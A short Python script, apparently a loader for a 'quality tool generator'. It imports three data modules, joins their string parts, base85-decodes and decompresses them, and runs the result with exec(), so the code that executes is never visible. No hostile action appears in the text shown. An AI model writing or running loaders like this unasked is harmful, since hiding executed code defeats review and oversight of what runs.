#!/usr/bin/env python3
from __future__ import annotations

import base64
import importlib
import zlib


def _payload(module_name: str, part_name: str) -> str:
    module = importlib.import_module(module_name)
    for name in (part_name, "DATA"):
        value = getattr(module, name, None)
        if isinstance(value, str):
            return value
    raise RuntimeError(f"{module_name} does not define {part_name} or DATA")


payload = (
    _payload("_quality_tool_generator_data_1", "DATA_PART_1")
    + _payload("_quality_tool_generator_data_2", "DATA_PART_2")
    + _payload("_quality_tool_generator_data_3", "DATA_PART_3")
)
exec(compile(zlib.decompress(base64.b85decode(payload)), __file__, "exec"))
